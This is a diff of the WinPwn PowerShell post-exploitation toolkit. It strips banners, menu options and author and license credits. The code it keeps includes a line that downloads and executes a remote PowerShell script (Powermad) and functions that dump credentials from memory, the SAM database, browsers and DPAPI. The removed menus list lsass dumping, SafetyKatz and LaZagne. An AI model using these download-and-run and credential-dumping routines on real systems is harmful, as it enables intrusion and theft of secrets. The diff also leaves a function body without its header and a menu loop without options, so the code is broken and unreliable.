@@ -144,49 +144,7 @@ function adidnsmenu
         {
 	     @'
              
-__        ___       ____                 
-\ \      / (_)_ __ |  _ \__      ___ __  
- \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
-  \ V  V / | | | | |  __/ \ V  V /| | | |
-   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
-   --> ADIDNS menu @S3cur3Th1sSh1t
-'@
-            Write-Host "================ WinPwn ================"
-            Write-Host -ForegroundColor Green '1. Add ADIDNS Node! '
-            Write-Host -ForegroundColor Green '2. Remove ADIDNS Node! '
-            Write-Host -ForegroundColor Green '3. Add Wildcard entry! '
-            Write-Host -ForegroundColor Green '4. Remove Wildcard entry'
-	        Write-Host -ForegroundColor Green '5. Go back '
-            Write-Host "================ WinPwn ================"
-            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
-            
-            Switch ($masterquestion) 
-            {
-                1{adidns -add}
-                2{adidns -remove}
-                3{adidns -addwildcard}
-                4{adidns -removewildcard}
-             }
-        }
-        While ($masterquestion -ne 5)
-         
-           
-}
 
-
-
-function adidns
-{
-         param(
-        [switch]
-        $addwildcard,
-        [switch]
-        $removewildcard,
-        [switch]
-        $add,
-        [switch]
-        $remove
-	)
     pathcheck
     # Kevin-Robertsons Powermad for Node creation
     IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Powermad.ps1")
@@ -224,8 +182,7 @@ function SessionGopher
     <#
     .DESCRIPTION
         Starts slightly obfuscated SessionGopher to search for Cached Credentials.
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
+        
     #>
      param(
         [switch]
@@ -289,8 +246,7 @@ function Kittielocal
     <#
     .DESCRIPTION
         Dumps Credentials from Memory / Registry / SAM Database / Browsers / Files / DPAPI.
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
+        
     #>
     param(
         [switch]
@@ -373,27 +329,7 @@ function Kittielocal
         do
         {
 	     @'
-             
-__        ___       ____                 
-\ \      / (_)_ __ |  _ \__      ___ __  
- \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
-  \ V  V / | | | | |  __/ \ V  V /| | | |
-   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
-   --> Get some credentials
-'@
-            Write-Host "================ WinPwn ================"
-            Write-Host -ForegroundColor Green '1. Just run Invoke-WCMDump (no Admin need)! '
-            Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie! '
-            Write-Host -ForegroundColor Green '3. Run Safetykatz in memory (Admin session only)! '
-            Write-Host -ForegroundColor Green '4. Only dump lsass using rundll32 technique! (Admin session only) '
-            Write-Host -ForegroundColor Green '5. Download and run an obfuscated lazagne executable! '
-            Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
-            Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
-            Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
-	        Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
-	        Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'
-		Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords!'
-	        Write-Host -ForegroundColor Green '12. Go back '
+
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
